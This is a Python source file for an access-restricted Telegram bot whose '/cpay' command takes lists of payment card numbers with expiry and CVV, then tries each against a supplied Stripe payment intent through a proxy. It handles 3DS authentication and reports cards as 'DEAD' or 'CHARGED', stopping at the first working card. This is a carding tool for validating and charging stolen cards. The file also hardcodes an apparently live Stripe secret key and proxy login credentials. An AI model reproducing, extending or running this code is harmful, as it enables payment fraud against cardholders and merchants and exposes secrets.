from pyrogram import Client, filters
from pyrogram.types import Message
import stripe
import requests
import base64
import json
import re
from EQUROBOT import app


# Stripe Secret Key
stripe.api_key = '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'

# Proxy Configuration
combined_proxy = "prox-cn.pointtoserver.com:10799:purevpn0s3978104:hk6vchvcmyah"
components = combined_proxy.split(':')
username = components[2]
password = components[3]
proxy = components[0]
proxy_port = components[1]
proxy_auth = f"{username}:{password}@{proxy}:{proxy_port}"
proxies = {
    "http": f"http://{proxy_auth}",
    "https": f"http://{proxy_auth}"
}
# Allowed user IDs
AUTH = list(map(int, "7427691214 7091230649 6271170584".split()))
#app = Client("stripe_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
def pistuff(cc, mes, ano, cvv, pk, secretpi, pi, proxies):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }
    response = session.post("https://m.stripe.com/6", headers=headers, proxies=proxies)
    json_data = response.json()
    m = json_data.get("muid")
    s = json_data.get("sid")
    g = json_data.get("guid")

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=skibidi+sigma+csub&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={secretpi}'
    response = session.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers, data=data, proxies=proxies)
    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    if '"status": "succeeded"' in response.text:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful", True, response, pi)
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD", False, response, pi)
    else:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}", False, response, pi)


def handle_additional_steps(response, proxies, start_num, line_clean, pk, pi, client_secret):
    if "declined" in response.text or "incorrect_number" in response.text or "Your card's expiration" in response.text or "expired_card" in response.text:
        return False, f"[ {start_num} ] ➠ DEAD CC: {line_clean} ➤ Response: {response.json().get('error', {}).get('message', '')}"
    else:
        next_action = response.json().get("next_action", {})
        use_stripe_sdk = next_action.get("use_stripe_sdk", {})
        three_d = use_stripe_sdk.get("three_d_secure_2_source", "")
        servertrans = use_stripe_sdk.get("server_transaction_id", "")
        result = json.dumps({"threeDSServerTransID": servertrans})
        enc_server = base64.b64encode(result.encode()).decode()
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        }
        data = {
            "source": three_d,
            "browser": json.dumps({
                "fingerprintAttempted": True,
                "fingerprintData": enc_server,
                "challengeWindowSize": None,
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserColorDepth": "24",
                "browserScreenHeight": "1080",
                "browserScreenWidth": "1920",
                "browserTZ": "360",
                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
            }),
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk
        }
        response4 = requests.post("https://api.stripe.com/v1/3ds2/authenticate", headers=headers, data=data, proxies=proxies)
        authenticate = response4.json()
        state = authenticate.get("state", "")
        if state == "challenge_required":
            return False, f"[ {start_num} ] {line_clean} ➠ Error: OTP Required, Change Card."
        elif state == "failed":
            return False, f"[ {start_num} ] {line_clean} ➠ Error: The provided PaymentMethod has failed authentication, Change Card."
        elif state == "processing_error":
            return False, f"[ {start_num} ] {line_clean} ➠ Error: Invalid authenticate account, Change Card."
        headers5 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
        }
        response5 = requests.get(
            f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}&is_stripe_sdk=false&client_secret={client_secret}",
            headers=headers5,
            proxies=proxies,
        )
        final = response5.json()
        fstatus = final.get("status", "")
        if fstatus == "succeeded":
            return True, f"[ {start_num} ] ➠ ⚡️ CHARGED CC: {line_clean} ➤ Your Payment Succeeded ✅"
        else:
            return False, f"[ {start_num} ] {line_clean} ➠ Final Response: {response5.text}"


@app.on_message(filters.command("cpay") & filters.user(AUTH))
async def handle_cc(client, message):
    user_id = message.from_user.id
    input = await app.ask(message.chat.id, "**SEND CC**", reply_to_message_id=message.id, user_id=user_id)
    if input.document:
        x = await input.download()
        await input.delete(True)
        with open(x, "r") as f:
            content = f.read()
        content = content.split("\n")
    else:
        content = input.text
        content = content.split("\n")
        await input.delete(True)
    input2 = await app.ask(message.chat.id, "**SEND PK**", reply_to_message_id=message.id, user_id=user_id)
    pk = input2.text
    await input2.delete(True)
    input3 = await app.ask(message.chat.id, "**SEND CS**", reply_to_message_id=message.id, user_id=user_id)
    cs = input3.text
    await input3.delete(True)
    input4 = await app.ask(message.chat.id, "**SEND pi**", reply_to_message_id=message.id, user_id=user_id)
    pi = input4.text
    await input4.delete(True)
    for i in content:
        cc, mes, ano, cvv = i.strip().split("|")
        result, success, response, pi = pistuff(cc, mes, ano, cvv, pk, cs, pi, proxies=proxies)
        await message.reply_text(result)
        if success:
            break
        additional_success, additional_message = handle_additional_steps(response, proxies, 0, cc, pk, pi, cs)
        await message.reply_text(additional_message)
        if additional_success:
            break
